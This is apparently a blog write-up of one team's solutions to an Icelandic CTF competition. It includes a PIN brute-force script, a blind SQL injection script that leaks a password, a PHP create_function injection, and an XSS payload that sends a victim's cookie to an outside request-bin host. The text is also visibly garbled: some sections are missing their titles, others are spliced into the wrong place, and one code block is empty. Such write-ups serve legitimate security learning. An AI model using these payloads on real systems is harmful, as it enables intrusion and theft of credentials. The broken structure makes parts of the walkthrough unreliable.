> The Icelandic Hacking Competition - pwnLANdir$ Writeups. Placed 27/150 Teams

## Introduction

I played on the team pwnLANdir$. This post will contain writeups for the challenges that I solved.

![teambreakdown](https://i.imgur.com/bxZgLrF.png)

## Hello_World (Misc)

The flag is given in the challenge description.

> IceCTF{hello_world}

## Discord Secrets (Misc)

The flag is located in the topic section of the general channel on the competition discord server.

## Pin (Web)

> You are late again, and just can't remember the PIN code to the locker that has the secret Novichok stuff you need for work. What do you do?

We are given a website where we can enter a pin: 

![pin1](https://i.imgur.com/6OHV1IG.png)

After entering a pin, we can see that the response time is returned.

Looking at the source code, we see a file ``pin.js``.

Here is the interesting part of the code:

```
  handleSubmit(e) {
    // YV
    e.preventDefault();
    const digit = e.target.innerHTML;
    const newEntered = this.state.entered + digit;

    this.setState(state => ({ placedwords: state.placedwords + 1, entered: newEntered, time: null }));

    console.log('entered: ' + newEntered);

    if (newEntered.length >= 4) {
       fetch ('/login/'+newEntered)
       .then(results => {
       		return results.json();
       }).then((data) => {
       		//let time = data.get('time');
		this.setState({ response: data, time: data.time, flag: data.flag });
		//console.log('woot');
		console.log(this.state.response);
		console.log(this.state.time);
		console.log(this.state.flag);
		if (data.correct == true) {
		    console.log('flag is ' + data.flag);
		    //window.sendMessage({event: "flag", flag: data.flag });
		}
       }).catch (err => { console.log(err);});
    }
  }
}
```

We can see that whenever we input a pin, it is sent to ``/login/pin`` and json data is returned. This data contains whether the flag is correct, the flag if correct, and the time it took to check the pin.

From here, there are two different solutions.

### Solution 1 - Brute Force

Since we can easily access the endpoint, we can easily write a script to check each and every pin (0000-9999) to get the flag.

```python
#http://www.misc-pin.vuln.icec.tf/login/2222
import requests

url = "http://www.misc-pin.vuln.icec.tf/login/"
num = 1

for i in range(0, 10000):
	url = url + str(i).zfill(4)
	r=requests.get(url)
	data = r.json()
	if data["correct"]:
		print(r.text)
		exit(1)
	else:
		print("Pin " + str(i).zfill(4) + " " + str(data['time']))
	num+=1
	print(r.text)
```

Using this, we can easily find the pin to be ``1729``.

```
http://www.misc-pin.vuln.icec.tf/login/1729

{"correct":true,"flag":"IceCTF{t1mIng_r3al1y_is_everyth1ng_isNt_it}","time":1432}
```

> IceCTF{t1mIng_r3al1y_is_everyth1ng_isNt_it}


### Method 2 - Timing

Whenever a pin is entered, we can see the response time. Whenever the first number was 1, I noticed the response takes longer (1200 compared to 1100). Whenever the second number is 7, the response time is 1300. Using this logic, I found the pin to be 1729.

I opened the image with ``stegsolve.jar`` and scrolled through the different available planes. One of them looked like a QR Code:

![qrcode](https://i.imgur.com/gXeqt2o.png)

I scanned this with my phone and got the flag.

## My Hometown

> I love my hometown, why hide it?

Starting off, we are given an image that looks like a movie cover. I reverse image searched it and that it corresponded to the comedy ``Eurovision Song Contest: The Story of Fire Saga``.

From the search results from the reverse image search, I could see several articles mentioning that the comedy was filmed in ``Husavik``, or has something to do with ``Husavik``. As the image is a ``jpg`` file, I was able to use the tool ``steghide`` to extract data from the image with the password ``Husavik``.

```
steghide extract -sf fs.jpg
```

Doing this and entering ``Husavik`` as the password, we are given the file ``secret.txt``. Here are the contents:

```python
n = 147767851294746620911810388038107728286037238915263678277473972113895902805449170503702649265216615588582242631818941986820754345835910513454492874669403644985033217666215892611622964797736512917384094418165479541796699940155391259232322549057354995706147434748297162590026274856168980580303832087722706212591
c = pow(bytes_to_long(m),3,n)
print(c)
#c = 748581664569261393653185381818017922717194231102617050589231695775701708792363247054972885709293669476065709136086780761429082534333192111209529254996467657486910468154090043100616141793324960308559815737581366862445109973777659037057000L
```

!!! Fun. It looks like we need to find ``m``, and to do so we would have to reverse the function ``pow(a, b, c)``. Sounds simple enough? Except that the third parameter ``c`` is mod, which is not reversable.

I found [this stackoverflow thread](https://stackoverflow.com/questions/49818392/how-to-find-reverse-of-powa-b-c-in-python) which mentioned that reversing this is similar to an RSA problem. Following the logic laid out in the post, I was able to convert the data we have to the following numbers:

```
n = 147767851294746620911810388038107728286037238915263678277473972113895902805449170503702649265216615588582242631818941986820754345835910513454492874669403644985033217666215892611622964797736512917384094418165479541796699940155391259232322549057354995706147434748297162590026274856168980580303832087722706212591
e = 3
c = 748581664569261393653185381818017922717194231102617050589231695775701708792363247054972885709293669476065709136086780761429082534333192111209529254996467657486910468154090043100616141793324960308559815737581366862445109973777659037057000
```

And now we have the form of a classic RSA problem. The exponent ``e`` is really small, so it is vulnerable to a small exponent attack.

I was able to take the following steps to solve for the plaintext ``m``. After that, I run ``long_to_bytes`` to reverse the function in the code above.

```
![bigbrainshit](https://i.imgur.com/buG0I20.png)
```

We are given a base64 string which decodes into coordinates.

```
64.0334627,-21.9000902
```

I was stuck with what to do at this point as they point to a town in Iceland. After asking the organizers, the flag is physically at those coordinates. Since I do not live anywhere near Iceland (and neither do several of the CTF players) we were given the option to submit a festive photo of the team in exchange for the flag.

After googling the words in this description, it is clear that this is an enigma machine challenge.

We are given the ciphertext, type of machine, rotors to mount (Walzenlage), initial position of rotor (Grundstellung), and the Plug board configuration (Steckerverbindungen). 

We need to find the initial position of rotor (Grundstellung) and the reflector (Umkehrwalze) in order to decode the ciphertext. There are only two possible reflectors for the parameters given (B and C) but several different initial positions, so I decided to brute force it with python.

It's like... sorta correct. Looking at the end: ``THECODEISICECTFTURINQNGNHINEX``

After guessing a lot, I was able to guess the correct flag.

After opening the binary in Ghidra, we can see one interesting part:

![xormekekw](https://i.imgur.com/XhL6Z8h.png)

Looks like the string there is run through an ``xor`` with the key of ``0x17``. Using cyberchef, I am easily able to get the flag.

## Creat

> Our friend decided to learn programming as his quarantine project! Sadly, he chose to learn PHP, and doesn't believe in the security vulnerabilities. Help us prove him wrong!

We are given the following code:

```
<?php
ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

include "flag.php";

if (isset ($_POST['c']) && !empty ($_POST['c'])) {
    $fun = create_function('$flag', $_POST['c']);
        //$fun();
} else {
    highlight_file(__FILE__);
}
?>
```

the ``create_function`` part is vulnerable. Whatever we put in it is basically run through ``eval``. We can inject something in there to end the current function's body, grab the flag, and then open another function body to prevent syntax errors. Here is what the final request looks like:

```

## Santa's Letters 

> Santa wanted to receive letters as usual this year, but in a covid-friendly way, so he built a website! Be nice!

We are given a website to submit letters to Santa. Since "Santa" will view each of the notes, we can grab Santa's cookie using an XSS attack. We do this by putting javascript code to send a request to a server along with his cookie. Here is the payload:

```
<script>
var xhr=new XMLHttpRequest(); xhr.open('GET', 'https://enh7fwgyjeyaa.x.pipedream.net/'.concat(document.cookie), true);xhr.send();
</script>
```

Looking at my request bin, I am given a request with the flag (the flag was the cookie).

## Thieving Lads!

> The Yule Lads are back at it again and have been stealing flags! They've hidden them behind an authenticated service, which they're 100% sure is fully secured. Can you prove them wrong and get our precious flags back?

We are given a webpage with a username field and a password field. Putting the character ``'`` into the username yeilds an "SQL Error". This means the form is vulnerable to SQL Injection.

Using the following injnection:

```
' or substr(username,1,1) = 'a' or '
```

I am able to get the error Invalid Password. Unfortunately, the password field is not vulnerable to injection. However, we can use Blind SQLi tactics to leak the password using the username field.

We are able to use substring to try and brute force each character of the password. However, using just substring does not work as it is case insensitive while the login form requires a case sensitive password. Because of this, I get the ascii value using ``unicode`` and try to find the first character of the password. Here is a sample username injection with this logic:

```
' or substr(username,1,1) = 'a' and unicode(substr(password,1,1)) = 90 or '
```

If the password as position 1 is ascii value 90, then the username will be found at the page will show Invalid Password. If not, then we will get something saying the username is not found as we are using ``AND`` with the injection. 

I wrote a script using this logic:


```python
import requests
import string
import time

#' or substr(username,1,1)) = 'a' or '
ans=""
found = False
for i in range(1, 25):
        for num in range(0,150):
                username = f"' or substr(username,1,1) = 'a' and unicode(substr(password,{i},1)) = {num} or '"
                datafrag = f"' or substr(password,1,1) = '{num}' or '"
                #print(datafrag)
                #exit(1)
                data = {'username': username, 'password': "whocares"}
                url = "http://www.web-theft.vuln.icec.tf/"
                r=requests.post(url, data=data)
                if "Invalid password!" in r.text:
                        ans+=chr(num)
                        print("New Hit!")
                        print(ans)
                #print(r.text)
                #time.sleep(1)
```

And I was able to leak the password: ``idwicpmYeRfkOUkGIG8``

Logging in with the following credentials:

```
username: ' or substr(username,1,1) = 'a' or '
password: idwicpmYeRfkOUkGIG8
```

gives us the flag.
